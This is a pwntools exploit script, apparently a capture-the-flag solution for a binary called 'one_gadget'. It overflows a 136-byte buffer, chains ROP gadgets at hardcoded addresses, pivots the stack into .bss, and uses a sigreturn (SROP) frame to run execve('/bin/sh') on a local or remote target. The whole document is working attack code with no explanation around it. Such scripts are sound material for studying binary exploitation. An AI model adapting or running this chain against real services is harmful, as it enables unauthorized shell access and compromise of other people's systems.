#!/usr/bin/env python3
from pwn import *
import sys, time

context.binary = elf = ELF('./one_gadget', checksec=False)
context.log_level = 'info'

POP_RDI_RBP = 0x402078          # pop rdi ; pop rbp ; ret
POP_RSI_RBP = 0x4071f1          # pop rsi ; pop rbp ; ret
POP_RAX = 0x41909b              # pop rax ; ret
SYSCALL_RET = 0x405036          # syscall ; ret
POP_RDX_LEAVE_RET = 0x467383    # pop rdx ; leave ; ret
POP_RSP = 0x413121              # pop rsp ; ret
JUNK = 0xdeadbeef
STACK = elf.bss() + 0x600


def start():
    if args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process([elf.path])


def main():
    io = start()
    io.recvline()

    # payload 1 - stack pivot to set rdx
    payload = b'A' * 136
    payload += p64(POP_RDI_RBP) + p64(0) + p64(JUNK) 
    payload += p64(POP_RSI_RBP) + p64(STACK) + p64(STACK) 
    payload += p64(POP_RAX) + p64(0) 
    payload += p64(SYSCALL_RET) 
    payload += p64(POP_RDX_LEAVE_RET) + p64(0x200)

    io.send(payload)
    time.sleep(0.4)
    io.send(b'B' * 8)
    time.sleep(0.4)

    # payload 2 - stack pivot to fit SROP frame
    payload2 = p64(0)
    payload2 += p64(POP_RSI_RBP) + p64(STACK + 0x100) + p64(JUNK)
    payload2 += p64(POP_RAX) + p64(0)
    payload2 += p64(SYSCALL_RET) 
    payload2 += p64(POP_RSP) + p64(STACK + 0x100)                        
    payload2  = payload2.ljust(0x100, b'\x00')

    io.send(payload2)
    time.sleep(0.4)

    # payload 3 - SROP + execve("/bin/sh")
    BINSH = STACK + 0x100 + 8 + 8 + 8 + 248

    frame = SigreturnFrame()
    frame.rax = 59
    frame.rdi = BINSH
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = SYSCALL_RET
    frame.rsp = elf.bss() + 0x900

    payload3 = p64(POP_RAX) + p64(15)
    payload3 += p64(SYSCALL_RET)
    payload3 += bytes(frame)
    payload3 += b'/bin/sh\x00'

    io.send(payload3)
    io.interactive()


if __name__ == '__main__':
    main()
